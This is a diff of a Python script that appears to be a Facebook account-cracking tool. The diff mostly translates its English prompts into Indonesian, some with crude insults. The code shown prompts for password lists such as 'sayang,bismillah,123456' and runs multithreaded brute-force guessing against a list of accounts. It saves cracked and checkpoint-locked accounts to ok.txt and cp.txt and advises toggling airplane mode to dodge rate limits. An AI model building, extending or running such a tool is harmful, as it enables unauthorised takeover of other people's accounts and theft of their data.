+				print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
@@ -1046,7 +1045,7 @@ class crackffb:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+			print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -1080,11 +1079,11 @@ class bapi:
     self.loop = 0
     self.krah(isifile)
   def krah(self,isifile):
-    print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
+    print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan PasswordManual [d/m]"))
     while True:
-      f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+      f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
       if f in[""," "]:
-        print((k+"["+p+"!"+k+"]"+p+" Invalid Number"))
+        print((k+"["+p+"!"+k+"]"+p+" Nomor Invalid Kentod!!"))
         continue
       elif f in["m","M"]:
         try:
@@ -1097,7 +1096,7 @@ class bapi:
               print((k+"["+p+"!"+k+"]"+p+" %s"%e))
               continue
           self.fl=[]
-          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+          print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
           self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
           if len(self.pw) ==0:
             continue
@@ -1109,7 +1108,7 @@ class bapi:
         except Exception as e:
           print(("  %s"%e))
           continue
-        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+        print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
         ThreadPool(30).map(self.brute,self.fl)
         #os.remove(self.apk)
         exit()
@@ -1131,7 +1130,7 @@ class bapi:
             except:continue
         except:
           continue
-        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+        print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
         ThreadPool(30).map(self.brute,self.fl)
         os.remove(self.apk)
         exit()
@@ -1190,11 +1189,11 @@ class bapittl:
     self.loop = 0
     self.krah(isifile)
   def krah(self,isifile):
-    print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
+    print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
     while True:
-      f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+      f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
       if f in[""," "]:
-        print((k+"["+p+"!"+k+"]"+p+" Invalid Number"))
+        print((k+"["+p+"!"+k+"]"+p+" Nomor Invalid Kentod!!"))
         continue
       elif f in["m","M"]:
         try:
@@ -1207,7 +1206,7 @@ class bapittl:
               print((k+"["+p+"!"+k+"]"+p+" %s"%e))
               continue
           self.fl=[]
-          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+          print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
           self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
           if len(self.pw) ==0:
             continue
@@ -1219,7 +1218,7 @@ class bapittl:
         except Exception as e:
           print(("  %s"%e))
           continue
-        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+        print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
         ThreadPool(30).map(self.brute,self.fl)
         #os.remove(self.apk)
         exit()
@@ -1241,7 +1240,7 @@ class bapittl:
             except:continue
         except:
           continue
-        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+        print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
         ThreadPool(30).map(self.brute,self.fl)
         os.remove(self.apk)
         exit()
@@ -1318,23 +1317,23 @@ def results(Renocintasagiri,Krahkrah):
                 print(("[CP] : "+str(len(Krahkrah))))
         if len(renocintasagiri) ==0 and len(Krahkrah) ==0:
                 print("\n")
-                print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
+                print((k+"["+p+"!"+k+"]"+p+" File Tidak Ada!!"))
 
 def ress():
     os.system("clear")
     banner()
-    print((k+"\n[ "+p+"Result Crack"+k+" ]"+p))
+    print((k+"\n[ "+p+"Lihat Hasil Crack"+k+" ]"+p))
     print((h+"\n[ "+p+"OK"+h+" ]"+p))
     try:
         os.system("cat ok.txt")
     except IOError:
-        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
+        print((k+"["+p+"!"+k+"]"+p+" File Tidak Ada!!"))
     print((k+"\n[ "+p+"CP"+k+" ]"+p))
     try:
         os.system("cat cp.txt")
     except IOError:
-        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
-    input(k+"\n[ "+p+"Back"+k+" ]"+p)
+        print((k+"["+p+"!"+k+"]"+p+" File Tidak Ada"))
+    input(k+"\n[ "+p+"Kembali"+k+" ]"+p)
     menu()
 
 if __name__=="__main__":
